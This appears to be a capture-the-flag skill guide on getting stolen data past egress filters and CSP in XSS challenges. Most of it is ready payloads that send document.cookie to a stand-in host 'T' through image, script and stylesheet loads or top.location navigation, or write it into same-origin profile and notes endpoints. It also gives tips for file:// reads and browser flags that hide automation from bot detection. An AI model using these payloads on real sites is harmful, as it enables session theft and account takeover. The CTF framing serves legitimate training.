# Evasion deep — the blocked-channel playbook in detail

## The egress-filter taxonomy

| Filter | Signature | Bypass |
|---|---|---|
| CSP `connect-src` blocks fetch | `Refused to connect` in console | a subresource CSP allows (img/script), or same-origin write |
| all outbound HTTP filtered | `requestfailed` to your tunnel, `RESP:0` | same-origin channel; DNS |
| TLS/SNI filtered | `ERR_SSL` on your host | an allowed host; http:// |
| interstitial tunnel | `fetch` returns confirm HTML not your body | a tunnel without a confirm page |
| DNS-only egress | TCP blocked, DNS resolves | DNS exfil through a resolver you watch |

## The same-origin pivot (the reliable one)

When off-origin is blocked, the flag does not leave — the payload
stashes it on the app's own origin where you read it back:

```javascript
// write the flag to a profile field you can read
fetch('/api/profile',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({bio:document.cookie})});
// store it in a note/comment
fetch('/api/notes',{method:'POST',body:'n='+document.cookie});
// put it in a page you can fetch
fetch('/api/settings',{method:'POST',body:'x='+document.cookie});
```

The channel is the app itself — the payload is a *write*, and your
read is a normal same-origin request you make afterward.

## The subresource-CSP pivot

`connect-src` blocks `fetch`/`XHR`; `img-src`/`script-src` are often
looser:

```javascript
new Image().src='https://T/i.png?c='+document.cookie;         // img-src
var s=document.createElement('script');s.src='https://T/j.js?c='+document.cookie;document.body.append(s); // script-src
var l=document.createElement('link');l.rel='stylesheet';l.href='https://T/s.css?c='+document.cookie;document.head.append(l); // style-src
```

Read the CSP header from the rendered page — the directive that
survives names the channel.

## The navigation exfil

When `fetch` is blocked but the page can navigate, `top.location`
carries the flag in the URL to your listener:

```javascript
top.location='https://T/?c='+encodeURIComponent(document.cookie);
window.open('https://T/?c='+document.cookie);
```

The browser's own navigation is harder for a filter to block than a
scripted `fetch` — the request is a real page load.

## The file-read-block pivot

| Blocked | Try |
|---|---|
| `file://` nav | `execute` `fetch("file://")` — JS read, not nav |
| both | `localhost`/origin HTTP — the app's own surface |
| `localhost` | the app's own origin — a route it serves |
| the whole surface | the class is dead at the endpoint — pivot to `../web-ssrf/` |

## The reproduction-evasion

When the challenge's anti-bot check rejects your local driver
(`navigator.webdriver`, headless fingerprint), launch with the flags
the real bot uses — `--disable-blink-features=AutomationControlled`
if the bot hides it, a matching `--user-agent` — so the reproduction
is the same environment the payload faces.

## The honest bound

Evasion is about the *channel and the reproduction* — never chain an
evasion to defeat the contest's anti-cheat or rules. The skill covers
reaching the flag through a real browser inside scope; it does not
cover evading the contest's own controls.
